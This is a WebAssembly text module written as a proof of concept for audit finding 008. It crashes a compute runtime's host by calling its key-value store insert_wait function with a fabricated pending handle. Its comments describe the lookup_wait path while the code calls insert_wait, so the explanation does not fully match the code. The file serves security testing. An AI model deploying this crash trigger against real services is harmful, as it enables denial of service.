;; PoC for finding 008: Invalid pending-operation handles panic on await
;;
;; In src/component/compute/kv_store.rs, await_lookup (line 79) and similar
;; functions call take_pending_kv_lookup(...).unwrap(). A stale or fabricated
;; pending handle causes a host panic.
;;
;; This PoC uses the wiggle ABI path: kv_store lookup_wait with a bogus
;; pending lookup handle.
;;
;; Trigger: serve this module and send any HTTP request.
;; Expected: the insert_wait call with an invalid pending handle should
;; return an error or panic depending on the ABI path.

(module
  (import "fastly_kv_store" "insert_wait"
    (func $kv_store_insert_wait (param i32 i32) (result i32)))

  (memory (export "memory") 1)

  (func (export "_start")
    ;; Call insert_wait with a completely bogus pending insert handle
    (call $kv_store_insert_wait
      (i32.const 0xDEAD)  ;; invalid pending insert handle
      (i32.const 100)     ;; kv_error_out pointer
    )
    drop
  )
)
